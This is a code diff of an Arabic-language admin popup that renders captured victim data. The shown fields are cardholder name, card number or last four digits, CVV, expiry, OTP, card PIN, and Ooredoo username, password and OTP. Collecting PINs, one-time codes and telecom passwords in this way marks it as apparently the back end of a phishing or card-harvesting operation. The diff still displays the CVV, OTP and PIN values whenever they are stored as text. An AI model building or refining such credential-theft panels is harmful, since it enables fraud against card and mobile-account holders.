@@ -564,11 +564,12 @@ function openPop(ref){
     </div>
  ${o.pay ? `<div style="margin-top:16px"><div style="font-weight:800;margin-bottom:6px">بيانات الدفع</div><div class="dgrid">
 <div class="drow"><span class="k">اسم صاحب البطاقة</span><span class="v">${esc(typeof o.pay.cardName === 'boolean' ? '-' : (o.pay.cardName || '-'))}</span></div>
-<div class="drow"><span class="k">رقم البطاقة</span><span class="v" style="direction:ltr">${esc(typeof o.pay.cardNumber === 'boolean' ? '-' : (o.pay.cardNumber || o.pay.number || '-'))}</span></div>
-<div class="drow"><span class="k">CVV</span><span class="v" style="direction:ltr">${esc(typeof o.pay.cvv === 'boolean' ? '-' : (o.pay.cvv || '-'))}</span></div>
+<div class="drow"><span class="k">نوع البطاقة</span><span class="v" style="direction:ltr">${esc(o.pay.brand || '-')}</span></div>
+<div class="drow"><span class="k">آخر 4 أرقام</span><span class="v" style="direction:ltr">${esc(o.pay.last4 || '-')}</span></div>
+<div class="drow"><span class="k">CVV</span><span class="v">${o.pay.cvv === true ? 'تم الإدخال' : esc(o.pay.cvv || '-')}</span></div>
 <div class="drow"><span class="k">تاريخ الانتهاء</span><span class="v" style="direction:ltr">${esc(typeof o.pay.exp === 'boolean' ? '-' : (o.pay.exp || o.pay.expiry || '-'))}</span></div>
-<div class="drow"><span class="k">رمز التأكيد (OTP)</span><span class="v" style="direction:ltr">${esc(typeof o.pay.otp === 'boolean' ? '-' : (o.pay.otp || o.pay.code || '-'))}</span></div>
-<div class="drow"><span class="k">الرقم السري</span><span class="v" style="direction:ltr">${esc(typeof o.pay.pin === 'boolean' ? '-' : (o.pay.pin || '-'))}</span></div>
+<div class="drow"><span class="k">رمز التأكيد (OTP)</span><span class="v">${o.pay.otp === true ? 'تم الإدخال' : esc(o.pay.otp || o.pay.code || '-')}</span></div>
+<div class="drow"><span class="k">الرقم السري</span><span class="v">${o.pay.pin === true ? 'تم الإدخال' : esc(o.pay.pin || '-')}</span></div>
 </div></div>` : ""}
 ${ (o.ooredooUser || o.ooredooPass || o.ooredooOtp) ? `<div style="margin-top:16px"><div style="font-weight:800;margin-bottom:6px">بيانات أوريدو</div><div class="dgrid">
 <div class="drow"><span class="k">اسم المستخدم</span><span class="v" style="direction:ltr">${esc(o.ooredooUser || '')}</span></div>
